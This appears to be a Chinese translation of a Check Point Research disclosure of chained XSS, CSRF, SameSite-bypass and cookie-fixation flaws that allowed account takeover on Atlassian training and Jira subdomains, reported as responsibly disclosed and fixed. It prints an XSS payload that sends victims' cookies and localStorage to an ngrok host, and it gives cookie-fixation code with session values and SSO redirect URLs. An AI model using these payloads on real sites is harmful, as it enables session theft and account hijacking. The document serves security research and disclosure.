## 背景

2002年在澳大利亚成立的“Atlassian”公司为软件开发人员、项目经理和其他与软件有关的团队开发产品，这些团队使用该平台进行数据协作和信息共享，这个公司在全球拥有超过
180,000 名客户和数百万用户。

由于 COVID-19 的爆发，全球劳动力转向远程工作，所以 Atlassian
提供的工具对团队来说变得更加流行和关键，同时无缝过渡到新工作模式的需求成为全球必需品。

Atlassian 将此称为“The Rise of Work
Anywhere”（随处工作的兴起），对大流行期间远程工作的性质进行了研究。该研究调查了澳大利亚、法国、德国、日本和美国的 5,000
多名参与者，并展示了现代工作的细微差别是如何被放大的，要求组织改变管理日益分散的劳动力的方式。

## 突破平台

2020年11月16日，Check
Point研究公司（CPR）发现了一些连锁漏洞，这些漏洞可以用来接管账户并控制一些通过SSO连接的Atlassian应用程序，这些连锁漏洞可能影响到如下几个领域：

> \- jira.atlassian.com
>
> \- confluence.atlassian.com
>
> \- getsupport.atlassian.com
>
> \- partners.atlassian.com
>
> \- developer.atlassian.com
>
> \- support.atlassian.com
>
> \- training.atlassian.com

像这样的供应链攻击之所以如此重要，是因为一旦攻击者利用了这些漏洞并接管了一个账户，他就可以植入后门，在未来的攻击中使用。这可能会造成严重的损害，并且只有在损害发生后才会被发现和控制。

 **Check Point
Research负责任地将这一信息透露给Atlassian团队，并部署了一个解决方案，以确保其用户能够安全地继续在各种平台上分享信息。**

## 深入研究

Atlassian使用SSO（单点登录）在Atlassian产品之间进行导航，如JIRA、Confluence和合作伙伴。

Atlassian实施了各种网络安全措施，如CSP、SameSite“Strict”cookie 和 HttpOnly
cookies。我们不得不使用几种攻击技术的组合来绕过这些安全方法。总的来说，我们能够实现完全的账户接管。

首先，我们必须找到一种方法将代码注入Atlassian--我们使用了XSS和CSRF的方法。然后，利用这个代码注入，我们能够为用户的账户添加一个新的会话cookie，通过结合Atlassian域名中的会话固定漏洞，我们能够接管账户。

让我们深入了解一下我们发现的第一个漏洞：

### XSS（跨站脚本攻击）

第一个安全问题是在子域 **training.atlassian.com** 上发现的。培训平台为用户提供课程或学分。

我们注意到，这个子域的内容安全策略（CSP）配置得很差，有 "unsafe-inline "和 "unsafe-eval
"指令，允许脚本执行。这使得这个子域成为我们研究的完美起点。

![](https://image.3001.net/images/20210807/1628320336_610e325043367e8bdab77.png!small)

  

我们检查了向购物车添加课程和学分时的请求参数。我们发现，当项目类型为 **"training_credit"** 时，一个额外的参数
**"options._training_credit_account"** 被添加到请求中。这个参数被发现容易被XSS攻击。

![](https://image.3001.net/images/20210807/1628320371_610e3273b818f409547fa.png!small)

让我们测试一个简单的有效负载来接收用户的所有 cookie 和本地存储：

    
    
    "><svg/onload="window.location.href=`//7a4389292a5d.ngrok.io?l=${JSON.stringify(localStorage)}&c=${document.cookie}`">

 **有用！**

![](https://image.3001.net/images/20210807/1628320436_610e32b4549cd12c83996.png!small)

我们收到了目标的所有 cookie 和本地存储：

![](https://image.3001.net/images/20210807/1628320461_610e32cd4e001e91c126c.png!small)

### CSRF（跨站请求伪造）

由于存储的XSS只能在向购物车添加物品时运行，我们需要让用户在不知不觉中添加一个恶意的物品。然后，由于没有CSRF令牌，我们可以对购物清单进行CSRF攻击，并执行我们的有效载荷。

为了实现这一点，我们将以下 POC 上传到我们的服务器并将其发送给受害者：

![](https://image.3001.net/images/20210807/1628322665_610e3b69e6ad42de36796.png!small)

但是，一些与受害者会话相关的 cookie 被设置为 SameSite “Strict”，这意味着浏览器会阻止它们被发送到后端。

令人惊讶的是，我们发现在 SSO 过程中，那些丢失的 cookie 由后端完成，这将基本上为我们绕过 SameSite“Strict”。

### SameSite “Strict” 绕过

我们现在将描述 SSO 流程。我们从源头https://7a4389292a5d.ngrok.io的 XSS 负载开始：

![](https://image.3001.net/images/20210807/1628320490_610e32ea4907c8897559d.png!small)

在 SSO 流程中，用户多次被重定向到不同的路径，例如： /auth/cart 、login.html 等。
在整个重定向过程中，用户经历了身份验证过程，这会添加我们需要的缺失 cookie并受到 SameSite 的保护。

因为我们的有效负载是存储型 XSS，所以它被存储在数据库中并被添加到购物清单中。在这里我们可以看到payload被成功注入到页面中：

![](https://image.3001.net/images/20210807/1628320519_610e3307a8255743ae15c.png!small)

并将恶意商品添加到购物车中：

![](https://image.3001.net/images/20210807/1628320539_610e331b2f7e84390ddaf.png!small)

在这一步中，我们使用内联 JavaScript 绕过了针对 CSRF 和 CSP 的 SameSite “Strict”。

然而，更有趣的 cookie 是 **JSESSIONID** ，它受 **HttpOnly** 保护，我们无法通过 JavaScript 劫持它。

此时我们可以代表用户执行操作，但不能登录他的帐户。我们深入研究了 SSO 流程，以发现流程中的另一个缺陷。

### HTTPOnly 绕过和 Cookie 修复

 **什么是 cookie 固定？**

Cookie Fixation 是指攻击者可以远程强制用户使用他已知的会话 cookie，该 cookie 将通过身份验证。

最初，当用户浏览到登录页面时，服务器会生成一个带有“path=/”标志的新会话 cookie。该 cookie
不与任何帐户关联，只有在用户通过身份验证过程后，相同的 cookie 才会关联到他的帐户。

我们知道使用 XSS 无法获取用户的会话 cookie，因为它受到 HTTPOnly 标志的保护。相反，我们可以创建一个新的伪造的。新创建的
JSESSION cookie 具有与原始 cookie 相同的标志，但有一个重大变化 -- 路径标志。

原始路径标志设置为根目录。我们想知道如果我们将其更改为更特殊的路径会发生什么。事实证明，我们的路径将具有优先权，因为它更具体并且将被使用而不是原始路径。

我们将路径更改为我们知道用户将在身份验证后重定向到的确切指令，这会导致后端对原始 cookie 进行授权。

通过使用 cookie 固定，我们绕过了 HTTPOnly 并劫持了用户的 Atlassian 帐户。我们将在以下子域上证明这一点：

 **Training.atlassian.com**

我们首先从没有任何缓存的干净浏览器导航到 **training.atlassian.com** URL，以获取新的干净 **JSESSIONID**
cookie。

![](https://image.3001.net/images/20210807/1628320571_610e333b1c9ae6ee20b4f.png!small)

现在，我们在后端有一个没有任何信息的 **JSESSIONID** 。如果我们将请求发送到用户个人资料页面，我们将被重定向到登录页面。

我们现在将对目标执行 Cookie 固定，这将通过使用以下步骤强制他使用伪造的 Cookie：

我们首先修改我们的有效负载并添加以下 cookie：

    
    
    document.cookie = "JSESSIONID= 5B09C73BF13FE923A2E5B4EE0DAD30E3; Domain=training.atlassian.com; Path=
    /auth0; Secure”

请注意，原始 HttpOnly cookie 是为路径“/”设置的，但我们在有效负载中设置的新 cookie 是为路径“/auth0”设置的。浏览到
/auth0，有 2 个 cookie：真实的和我们的。在这种情况下，我们将“获胜”，因为它更具体。

我们将使用以下重定向来触发此 cookie 而不是真实的身份验证。这里有趣的参数是“
**redirect_uri=https://training.atlassian.com/auth0** ”，它将强制对
**training.atlassian.com** 进行身份验证：

    
    
    location.href="https://atlassianuni-learndot.auth0.com/authorize?redirect_uri=https://training.atlassian.com/auth0&client_id=O7FdHY647VvbCTphBGmvfBt2GdgnH7MR&audience=https%3A%2F%2Fatlassianuni-learndot.auth0.com%2Fuserinfo&scope=openid%20profile%20email&response_type=code&state=HxElpPySsrRuKcYbFOlp9QkLZQ7kwDOemX7Dc-5dnlk"

此身份验证请求会将我们的 cookie 与目标帐户相关联。

![](https://image.3001.net/images/20210807/1628320603_610e335b8396bc01e4ca5.png!small)

所以现在我们可以控制 **JSESSIONID** ，我们结合所有这些步骤并制作了以下有效负载：

![](https://image.3001.net/images/20210807/1628322561_610e3b0132ca2b79bcd35.png!small)

Cookie 修复结合 XSS 和 CSRF 错误使我们能够在 Atlassian 培训平台上执行完整的帐户接管。

使用相同的流程和 Cookie Fixation，我们可以导航到其他 Atlassian 产品，例如 **jira.atlassian.com**

 **Jira.atlassian.com**

要以相同的流程劫持 Jira 帐户，我们首先需要创建一个会话 cookie 来执行 Cookie Fixation。我们登录
**jira.atlassian.com** 并获取以下 cookie：

\- 会话ID

\- AWSALB

为了将这些 cookie 用于 Cookie Fixation，攻击者需要从他的帐户注销以获取干净的 **JSESSIONID** 。我们可以通过向
ViewProfile 发送请求来验证 cookie 不再与任何帐户相关联：

![](https://image.3001.net/images/20210807/1628320635_610e337bb70c0ba509fad.png!small)

接下来，我们将修改我们的有效载荷，我们将执行与 training.atlassian.com 中相同的方法：

    
    
    document.cookie=”JSESSIONID=1672885C3F5E4819DD4EF0BF749E56C9; Domain=.atlassian.com; Path=/plugins; Secure;”
    document.cookie=”AWSALB=iAv6VKT5tbu/HFJVuu/dTE7R80wQXNjR+0opVbccE0zIadORJVGMZxCUcTIglL3OZ/A54eu/NDNLP5I3zE+WcgGWDHpv17SexjFBc1WYA9moC4wEmPooEE/Uqoo2; Domain=.atlassian.com; Path=/plugins/; Secure;”

请注意，原始 HTTPOnly cookie 是为路径“/”设置的，但我们正在设置的新 cookie 是为路径“/plugins”设置的。浏览到
/auth0，有 2 个 cookie：真实的和我们的。在这种情况下，我们的将“获胜”，因为它是一个路径 cookie。

我们将使用以下重定向来触发此 cookie 而不是真实的身份验证。这里有趣的参数是“
**redirect_uri=https://jira.atlassian.com/plugins** ”，它将强制对
**jira.atlassian.com** 进行身份验证并将我们重定向到 /plugins。

    
    
    location.href=”https://auth.atlassian.com/authorize?redirect_uri=https://jira.atlassian.com/plugins/servlet/authentication/auth_plugin_original_url%3Dhttps%253A%252F%252Fjira.atlassian.com%252F&client_id=QxUVh9tTugoLC5cgY3Vjkz3h1jPSvG9p&scope=openid+email+profile&state=4118f57f-a9d9-4f6d-a1d5-add939762f23&response_type=code&prompt=none”

此身份验证请求会将我们的 cookie 与目标帐户相关联。

从以下请求中可以看出，cookie 现在与目标用户（在本例中为“John Doe”）相关联。

![](https://image.3001.net/images/20210807/1628320660_610e3394768c2e8aab49a.png!small)

所以现在我们可以控制 **JSESSIONID** ，我们结合所有这些步骤并制作了以下有效负载：

![](https://image.3001.net/images/20210807/1628322897_610e3c51ecd7a152d34f5.png!small)

Cookie 修复与来自 **training.atlassian.com** 的 XSS 和 CSRF 错误相结合，使我们能够在
**Jira.atlassian.com** 上执行完整的帐户接管

### Bitbucket

我们研究的另一个方向是检查我们是否可以将恶意代码注入组织的 Bitbucket。Bitbucket 是 Atlassian 旗下的基于 Git
的源代码存储库托管服务，拥有超过 1000 万用户。访问公司的 Bitbucket 存储库可能允许攻击者访问和更改源代码，将其公开甚至植入后门。

有了 Jira 帐户，我们就有了几种获取 Bitbucket 帐户的方法。一种选择是打开带有指向攻击者控制的网站的恶意链接的 Jira 票证。

在 Jira 系统上创建票证后，将自动从 Atlassian 域向用户发送邮件。攻击者可以利用这一点，并在票证中包含一个指向窃取用户凭据的恶意网站的链接。

![](https://image.3001.net/images/20210807/1628320689_610e33b11af8b65d60a10.png!small)

## 结论

通过使用我们在 **training.atlassian.com** 上发现的带有 CSRF 的 XSS结合 Cookie 固定的方法，我们能够在
atlassian.com 下不使用 JWT 的每个子域上一键接管任何 Atlassian
帐户对于会话，并且容易受到会话固定的影响。例如：training.atlassian.com、jira.atlassian.com、developer.atlassian.com
等。

在这样的协作平台中接管帐户意味着能够接管不打算用于未经授权查看的数据。

Check Point Research 负责任地向 Atlassian 团队披露了此信息，并部署了解决方案以确保其用户可以安全地继续在各种平台上共享信息。

